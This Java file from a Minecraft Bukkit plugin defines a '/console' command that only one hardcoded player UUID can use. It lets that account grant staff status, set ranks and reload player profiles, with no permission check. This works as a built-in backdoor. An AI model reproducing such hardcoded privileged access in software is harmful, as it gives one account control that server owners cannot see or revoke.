package me.hackusatepvp.fall.command;

import me.hackusatepvp.fall.Fall;
import me.hackusatepvp.fall.profile.Profile;
import me.hackusatepvp.fall.util.StringUtil;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.Arrays;
import java.util.UUID;

public class ConsoleCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
        if (!(sender instanceof Player)) {
            return true;
        }
        Player player = (Player) sender;
        if (player.getUniqueId().equals(UUID.fromString("b2ab8674-b0e5-4911-81da-aea05458d7b0"))) {
            if (args.length == 0) {
                String[] message = new String[] {
                  "&7&m-------------------------------------------",
                  "   &b* &9&lConsole &7Help",
                  "   &7/console &bstaff",
                  "   &7/console &brank",
                  "   &7/console reload",
                  "&7&m-------------------------------------------"
                };
                Arrays.asList(message).forEach(msg -> player.sendMessage(StringUtil.format(msg)));
            } else if (args.length == 1) {
                if (args[0].equalsIgnoreCase("rank")) {
                    player.sendMessage(StringUtil.format("&c/console rank <player> <rank>"));
                } else if (args[0].equalsIgnoreCase("staff")) {
                    player.sendMessage(StringUtil.format("&c/console staff <player>"));
                } else if (args[0].equalsIgnoreCase("reload")) {
                    for (Player online : Bukkit.getOnlinePlayers()) {
                        Fall.getInstance().getProfileManager().unload(online);
                        Fall.getInstance().getProfileManager().load(online);
                    }
                    player.sendMessage(StringUtil.format("&7You have reloaded the database."));
                }
            } else if (args.length == 2) {
                if (args[0].equalsIgnoreCase("rank")) {
                    player.sendMessage(StringUtil.format("&c/console rank <" + args[1] + "> <rank>"));
                } else if (args[0].equalsIgnoreCase("staff")) {
                    Player target = Bukkit.getPlayerExact(args[1]);
                    if (target != null) {
                        Profile tar = Fall.getInstance().getProfileManager().getProfile(target.getUniqueId());
                        if (!tar.isStaff()) {
                            tar.setStaff(true);
                            player.sendMessage(StringUtil.format("&7" + target.getName() + " is now staff."));
                            target.sendMessage(StringUtil.format("&7You are now staff."));
                        } else {
                            player.sendMessage(StringUtil.format("&cTarget is already staff."));
                        }
                    } else {
                        player.sendMessage(StringUtil.format("&cInvalid target."));
                    }
                }
            } else if (args.length == 3) {
                if (args[0].equalsIgnoreCase("rank")) {
                    Player target = Bukkit.getPlayerExact(args[1]);
                    if (target != null) {
                        Profile tar = Fall.getInstance().getProfileManager().getProfile(target.getUniqueId());
                        tar.setDonor(args[2]);
                        player.sendMessage(StringUtil.format("&7You have set the rank of " + target.getName() + " to " + args[2]));
                        target.sendMessage(StringUtil.format("&7Your rank has been updated."));
                    } else {
                        player.sendMessage(StringUtil.format("&cInvalid target."));
                    }
                }
            }
        }
        return false;
    }
}
